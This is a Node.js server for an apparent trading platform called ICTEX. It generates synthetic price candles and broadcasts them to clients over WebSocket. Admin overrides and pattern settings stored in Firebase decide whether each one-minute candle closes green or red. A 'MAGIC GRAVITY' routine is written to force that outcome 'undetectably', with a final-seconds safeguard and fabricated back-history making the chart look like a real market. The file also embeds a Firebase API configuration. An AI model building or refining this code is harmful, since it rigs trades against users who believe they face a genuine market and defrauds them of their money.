// --- START OF FILE server.js ---

const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const cors = require('cors');
const firebase = require('firebase/app');
require('firebase/database');

// ==========================================
// 1. FIREBASE CONFIGURATION (Must match v4.html)
// ==========================================
const firebaseConfig = {
    apiKey: "AIzaSyBUTMFblYIVovOe4F25XCFneJNTlVcoWCA",
    authDomain: "ictex-trade.firebaseapp.com",
    databaseURL: "https://ictex-trade-default-rtdb.firebaseio.com",
    projectId: "ictex-trade",
    storageBucket: "ictex-trade.appspot.com",
    messagingSenderId: "755532704199",
    appId: "1:755532704199:web:b27d7c9e7d0f4ac76291e2"
};

if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
const db = firebase.database();

const app = express();
app.use(cors());
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// ==========================================
// 2. CONSTANTS & GLOBAL STATE
// ==========================================
const MAX_CANDLES = 1000;
const TIMEFRAME = 60000; // 1 Minute
const TICK_MS = 300; // 300ms Update Rate for Smooth Chart
const MIN_PRICE = 0.00001;
const HISTORY_SEED_COUNT = 300;

const markets = {};
let lastSyncMinute = 0;

// ==========================================
// 3. UTILITY FUNCTIONS
// ==========================================
function roundPrice(v) {
    return parseFloat(Math.max(MIN_PRICE, v).toFixed(5));
}

function marketPathFromId(marketId) {
    return String(marketId || '').replace(/[\.\/ ]/g, '-').toLowerCase();
}

function generateHistoricalCandle(timestamp, open) {
    const safeOpen = Math.max(MIN_PRICE, open);
    const isGreen = Math.random() > 0.5;
    const body = (0.00006 + Math.random() * 0.00025) * safeOpen;
    const close = isGreen ? safeOpen + body : safeOpen - body;
    const upperWick = (0.00003 + Math.random() * 0.00015) * safeOpen;
    const lowerWick = (0.00003 + Math.random() * 0.00015) * safeOpen;

    return {
        timestamp,
        open: roundPrice(safeOpen),
        high: roundPrice(Math.max(safeOpen, close) + upperWick),
        low: roundPrice(Math.min(safeOpen, close) - lowerWick),
        close: roundPrice(close)
    };
}

// ==========================================
// 4. MARKET INITIALIZATION
// ==========================================
async function initializeNewMarket(marketId, fbMarket = {}) {
    const path = marketPathFromId(marketId);
    let startPrice = 1.15;

    // Restore last price from Firebase to maintain continuity after restart
    try {
        const liveSnap = await db.ref(`markets/${path}/live`).once('value');
        const lastLive = liveSnap.val();
        if (lastLive && lastLive.price) startPrice = lastLive.price;
    } catch (e) {}

    const nowPeriod = Math.floor(Date.now() / TIMEFRAME) * TIMEFRAME;
    const candles = [];
    let currentPrice = startPrice;

    // Generate Back-history
    for (let i = HISTORY_SEED_COUNT; i > 0; i--) {
        const c = generateHistoricalCandle(nowPeriod - (i * TIMEFRAME), currentPrice);
        candles.push(c);
        currentPrice = c.close;
    }

    markets[marketId] = {
        marketId,
        marketPath: path,
        history: candles,
        currentPrice: currentPrice,
        lastMove: 0,
        activePattern: null,
        activeOverride: null
    };

    console.log(`[Market Initialized] ${marketId} starting at ${currentPrice}`);

    // 🔥 Listen to Admin Sequence Commands
    db.ref(`admin/markets/${marketId}/pattern_config`).on('value', (snap) => {
        markets[marketId].activePattern = snap.val();
    });

    // 🔥 Listen to Quick Overrides
    db.ref(`admin/market_overrides/${marketId}`).on('value', (snap) => {
        markets[marketId].activeOverride = snap.val();
    });
}

function ensureCurrentPeriodCandle(marketData, currentPeriod) {
    let lastCandle = marketData.history[marketData.history.length - 1];
    if (!lastCandle) return null;

    // If minute changed, create a new candle
    if (currentPeriod > lastCandle.timestamp) {
        // Clear expired quick override
        if (marketData.activeOverride && marketData.activeOverride.timestamp < currentPeriod - 60000) {
            db.ref(`admin/market_overrides/${marketData.marketId}`).remove();
            marketData.activeOverride = null;
        }

        const newCandle = {
            timestamp: currentPeriod,
            open: lastCandle.close,
            high: lastCandle.close,
            low: lastCandle.close,
            close: lastCandle.close
        };
        marketData.history.push(newCandle);
        if (marketData.history.length > MAX_CANDLES) marketData.history.shift();
        return newCandle;
    }
    return lastCandle;
}

// ==========================================
// 5. REALISTIC PRICE & ADMIN CONTROL ENGINE
// ==========================================
function updateRealisticPrice(marketData, candle, now) {
    // 35% chance to do nothing (creates realistic stutter/pauses)
    if (Math.random() < 0.35) return;

    const openPrice = candle.open;
    const baseVolatility = openPrice * 0.00005;
    const sec = Math.floor((now % 60000) / 1000); // Current second inside the minute (0-59)
    
    let targetColor = null;

    // --- ADMIN COMMAND CHECK ---
    // Priority 1: Quick Override
    if (marketData.activeOverride) {
        const type = marketData.activeOverride.type;
        if (type === 'UP' || type.includes('GREEN') || type.includes('BULLISH')) targetColor = 'GREEN';
        else if (type === 'DOWN' || type.includes('RED') || type.includes('BEARISH')) targetColor = 'RED';
    } 
    // Priority 2: Sequence Pattern
    else if (marketData.activePattern && marketData.activePattern.isActive) {
        const p = marketData.activePattern;
        if (now >= p.startTime) {
            const idx = Math.floor((now - p.startTime) / 60000);
            if (idx >= 0 && idx < p.pattern.length) {
                targetColor = p.pattern[idx]; // 'GREEN' or 'RED'
            } else if (idx >= p.pattern.length) {
                // Sequence finished, delete from Firebase
                db.ref(`admin/markets/${marketData.marketId}/pattern_config`).remove();
                marketData.activePattern = null;
            }
        }
    }

    // --- NORMAL MOVEMENT (Impulse + Recoil) ---
    let impulse = (Math.random() - 0.5) * baseVolatility * 2.5;
    let recoil = -marketData.lastMove * 0.3;
    let jitter = (Math.random() - 0.5) * (baseVolatility * 0.2);
    let finalMove = impulse + recoil + jitter;

    // --- MAGIC GRAVITY (FORCING OUTCOME UNDETECTABLY) ---
    if (targetColor === 'GREEN') {
        // If it's supposed to be Green, but it's currently Red or close to Red
        if (marketData.currentPrice <= openPrice + (baseVolatility * 0.5)) {
            // Apply upward gravity. Gets stronger as time runs out (after 45s)
            finalMove = Math.abs(finalMove) + (baseVolatility * (sec > 45 ? 2.5 : 0.8));
        }
    } else if (targetColor === 'RED') {
        // If it's supposed to be Red, but it's currently Green or close to Green
        if (marketData.currentPrice >= openPrice - (baseVolatility * 0.5)) {
            // Apply downward gravity.
            finalMove = -Math.abs(finalMove) - (baseVolatility * (sec > 45 ? 2.5 : 0.8));
        }
    }

    // Apply move
    marketData.currentPrice += finalMove;
    marketData.lastMove = finalMove;

    // --- ABSOLUTE SAFEGUARD (Last 2 seconds) ---
    // Ensure 100% accuracy just before the candle closes
    if (sec >= 58 && targetColor) {
        if (targetColor === 'GREEN' && marketData.currentPrice <= openPrice) {
            marketData.currentPrice = openPrice + (baseVolatility * 1.5);
        } else if (targetColor === 'RED' && marketData.currentPrice >= openPrice) {
            marketData.currentPrice = openPrice - (baseVolatility * 1.5);
        }
    }

    // Update Candle Object
    candle.close = roundPrice(marketData.currentPrice);
    candle.high = roundPrice(Math.max(candle.high, candle.close));
    candle.low = roundPrice(Math.min(candle.low, candle.close));
}

// ==========================================
// 6. WEBSOCKET BROADCAST
// ==========================================
function broadcastCandle(marketId, candle) {
    const payload = JSON.stringify({ market: marketId, candle, serverTime: Date.now() });
    wss.clients.forEach((client) => {
        if (client.readyState === WebSocket.OPEN && client.subscribedMarket === marketId) {
            client.send(payload);
        }
    });
}

// Load Markets from Firebase
db.ref('admin/markets').on('value', (snapshot) => {
    const fbMarkets = snapshot.val() || {};
    Object.keys(fbMarkets).forEach((marketId) => {
        const type = fbMarkets[marketId]?.type;
        // Only initialize OTC or Simulated Real markets
        if ((type === 'otc' || type === 'broker_real') && !markets[marketId]) {
            initializeNewMarket(marketId, fbMarkets[marketId]);
        }
    });
});

// Handle Client Connections
wss.on('connection', (ws) => {
    ws.on('message', (raw) => {
        try {
            const msg = JSON.parse(raw.toString());
            if (msg?.type === 'subscribe') {
                ws.subscribedMarket = msg.market;
            }
        } catch (_) {}
    });
});

// ==========================================
// 7. MAIN ENGINE LOOP (TICKER)
// ==========================================
setInterval(() => {
    const now = Date.now();
    const currentPeriod = Math.floor(now / TIMEFRAME) * TIMEFRAME;
    const currentMinute = Math.floor(now / 60000);

    // 1. Process Chart Movements
    for (const marketId in markets) {
        const marketData = markets[marketId];
        let candle = ensureCurrentPeriodCandle(marketData, currentPeriod);
        if (!candle) continue;

        updateRealisticPrice(marketData, candle, now);
        broadcastCandle(marketId, candle);
    }

    // 2. Firebase Batch Backup (Once per minute)
    // Ensures charts recover correctly if Render restarts the server
    if (currentMinute > lastSyncMinute) {
        lastSyncMinute = currentMinute;
        const batchUpdates = {};
        
        for (const marketId in markets) {
            const m = markets[marketId];
            const lastC = m.history[m.history.length - 1];
            if (lastC) {
                batchUpdates[`markets/${m.marketPath}/live`] = {
                    price: lastC.close,
                    timestamp: lastC.timestamp,
                    marketId: marketId,
                    updatedAt: now
                };
            }
        }
        
        if (Object.keys(batchUpdates).length > 0) {
            db.ref().update(batchUpdates).catch(()=>{});
            console.log(`[Server Sync] ${Object.keys(markets).length} markets safely backed up to Firebase.`);
        }
    }
}, TICK_MS);

// Simple Health Check Endpoint for UptimeRobot
app.get('/ping', (_req, res) => res.send('ICTEX Server Engine is Live & Running!'));

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Server running perfectly on port ${PORT}`));

// --- END OF FILE ---